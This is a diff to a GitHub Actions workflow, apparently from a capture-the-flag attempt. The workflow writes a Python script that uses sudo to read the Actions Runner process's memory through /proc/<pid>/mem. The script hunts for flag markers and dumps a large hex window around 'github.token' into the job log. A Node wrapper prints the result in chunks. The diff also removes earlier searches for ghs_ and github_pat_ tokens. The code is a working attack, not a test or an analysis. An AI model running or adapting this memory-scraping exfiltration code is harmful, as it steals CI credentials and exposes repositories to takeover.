@@ -21,21 +21,8 @@ jobs:
           cat > content/scan.py <<'SCANEOF'
           import glob, os
 
-          MARKERS = [b'FLAG', b'F\x00L\x00A\x00G', b'ghs_', b'g\x00h\x00s\x00_', b'github_pat_']
           out = []
-          hits = 0
-
-          def find_hits(data, tag):
-              global hits
-              for m in MARKERS:
-                  i = data.find(m)
-                  n = 0
-                  while i != -1 and n < 3 and hits < 40:
-                      chunk = data[max(0, i - 32):i + 220]
-                      out.append('HIT %s marker=%r hex=%s' % (tag, m, chunk.hex()))
-                      hits += 1
-                      n += 1
-                      i = data.find(m, i + 1)
+          flag_found = 0
 
           def pids():
               for d in glob.glob('/proc/[0-9]*'):
@@ -46,20 +33,24 @@ jobs:
                       continue
                   yield pid, cmd
 
+          def find_flag(data, tag):
+              global flag_found
+              for m in [b'FLAG{', b'F\x00L\x00A\x00G\x00{']:
+                  i = data.find(m)
+                  while i != -1:
+                      out.append('FLAGHIT %s marker=%r hex=%s' % (tag, m, data[max(0,i-32):i+320].hex()))
+                      flag_found += 1
+                      i = data.find(m, i + 1)
+
           for pid, cmd in pids():
               if 'Runner' not in cmd:
                   continue
-              out.append('PROC %s %s' % (pid, cmd[:120]))
-              try:
-                  fds = os.listdir('/proc/%s/fd' % pid)
-                  out.append('FD %s %s' % (pid, ','.join(fds[:40])))
-              except Exception as e:
-                  out.append('FDERR %s' % e)
+              out.append('PROC %s %s' % (pid, cmd[:100]))
               try:
                   maps = open('/proc/%s/maps' % pid).read().splitlines()
-              except Exception as e:
-                  out.append('MAPERR %s %s' % (pid, e))
+              except Exception:
                   continue
+              dumped = 0
               total = 0
               for line in maps:
                   parts = line.split()
@@ -69,14 +60,12 @@ jobs:
                       a, b = [int(x, 16) for x in parts[0].split('-')]
                   except Exception:
                       continue
-                  if b <= a:
+                  if b <= a or dumped >= 1:
                       continue
-                  if total > 2000 * 1024 * 1024 or hits >= 40:
-                      break
                   off = a
                   with open('/proc/%s/mem' % pid, 'rb', 0) as f:
-                      while off < b and hits < 40:
-                          n = min(32 * 1024 * 1024, b - off)
+                      while off < b:
+                          n = min(16 * 1024 * 1024, b - off)
                           try:
                               f.seek(off)
                               data = f.read(n)
@@ -85,37 +74,22 @@ jobs:
                               continue
                           off += n
                           total += len(data)
-                          find_hits(data, 'pid' + pid)
+                          find_flag(data, 'pid' + pid)
+                          if dumped < 1 and b'github.token' in data:
+                              i = data.find(b'github.token')
+                              win = data[max(0, i - 1000):i + 300000]
+                              out.append('BLOB pid=%s at=%d len=%d hex=%s' % (pid, off - n + i, len(win), win.hex()))
+                              dumped += 1
               out.append('READ %s bytes=%d' % (pid, total))
 
-          def scan_file(p):
-              try:
-                  if os.path.getsize(p) > 32 * 1024 * 1024:
-                      return
-                  data = open(p, 'rb').read()
-              except Exception:
-                  return
-              find_hits(data, 'file:' + p)
-
-          for pat in ['/home/runner/actions-runner/_diag/*', '/home/runner/actions-runner/_work/_temp/*', '/home/runner/actions-runner/_work/_temp/*/*', '/home/runner/work/_temp/*']:
-              for p in glob.glob(pat):
-                  scan_file(p)
-
-          print('\n'.join(out[:200]))
-          print('DONE hits=%d' % hits)
+          print('\n'.join(out)[:1500000])
+          print('DONE flag_found=%d' % flag_found)
 
           SCANEOF
           cat > content/p.js <<'JSEOF'
-          const fs = require('fs');
           const cp = require('child_process');
-          let sudo = '';
-          try { sudo = cp.execSync('sudo -n id', { encoding: 'utf8', timeout: 60000 }).trim(); } catch (e) { sudo = 'ERR ' + e.message; }
-          console.log('SUDO ' + sudo);
-          let ls = '';
-          try { ls = cp.execSync('sudo -n bash -c "ls -la /home/runner/actions-runner/_work/_temp 2>&1 | head -30; echo ---; ls -la /home/runner/actions-runner/_diag 2>&1 | tail -8"', { encoding: 'utf8', timeout: 60000 }); } catch (e) { ls = 'LSERR ' + e.message; }
-          for (let i = 0; i < ls.length; i += 1800) console.log('LS ' + ls.slice(i, i + 1800));
           let scan = '';
-          try { scan = cp.execSync('sudo -n python3 /tmp/content/content/scan.py 2>&1', { encoding: 'utf8', timeout: 900000, maxBuffer: 64 * 1024 * 1024 }); } catch (e) { scan = 'SCANERR ' + e.message + ' ' + (e.stdout || ''); }
+          try { scan = cp.execSync('sudo -n python3 /tmp/content/content/scan.py 2>&1', { encoding: 'utf8', timeout: 900000, maxBuffer: 256 * 1024 * 1024 }); } catch (e) { scan = 'SCANERR ' + e.message + ' ' + (e.stdout || ''); }
           for (let i = 0; i < scan.length; i += 1800) console.log('SCAN ' + scan.slice(i, i + 1800));
 
           JSEOF
